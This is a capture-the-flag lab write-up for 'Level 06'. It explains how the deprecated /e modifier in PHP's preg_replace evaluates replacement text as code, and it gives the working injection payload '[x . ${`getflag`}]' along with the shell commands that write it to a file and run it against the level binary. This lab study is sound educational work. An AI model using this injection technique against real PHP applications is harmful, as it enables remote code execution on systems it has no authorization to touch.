# Level 06

**Exploit:** PHP `preg_replace` `/e` code injection

The vulnerability lies in the use of the deprecated `/e` modifier in `preg_replace()`. This modifier evaluates the replacement string as PHP code, allowing crafted file contents to execute commands.

## Walkthrough

The script reads a file and processes its contents using the following expression:

```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

step by step:
``` text
- `\[` matches a literal opening bracket (`[`).
- `x ` matches the letter `x` followed by a space.
- `(.*)` captures the content between the prefix and the closing bracket.
- `\]` matches a literal closing bracket (`]`).
- `/e` tells older PHP versions to evaluate the replacement string as PHP code.
```

So we can conclude that the regular expression matches text in the form `[x ...]`.

The second capture group, `\2`, contains the text matched by `(.*)`.

Suppose the input file contains:
```text
[x hello]
```

The regex matches the entire expression, and the second capture group contains:
```text
hello
```

The replacement string is:
```php
y("\2")
```

After substituting the captured text, PHP evaluates the equivalent of:
```php
y("hello")
```

The function `y()` then processes the string:

```php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
```
Since `hello` contains neither a dot nor an `@` character, the function returns it unchanged.

The result of the first replacement is therefore:

```text
hello
```

For ordinary input, the replacement behaves like a call to `y()` with the captured text as its argument.

The exploit uses the following input:

```text
[x . ${`getflag`}]
```

The regex recognizes the `[x ...]` structure and captures the content inside it (here: `getflag`).
The replacement mechanism substitutes this captured content into the PHP expression:

```php
y(". ${`getflag`}")
```

Because the replacement uses the `/e` modifier, the resulting expression is evaluated as PHP code rather than treated as ordinary text meaning commands can be executed.

The function `y()` is irrelevent from there because it is only characters subsitutions ('@'...). We don't really care as long as we can execute commands using the first regex. 

Meaning it doesn't affect the result of our exploit.

All right so let's create the file containing the regex that will break this code:
```bash
echo '[x . ${`getflag`}]' > /tmp/exploit
```

Run the Level06 program with the file as its argument:

```bash
./level06 /tmp/exploit
```
 
and boom we succeded !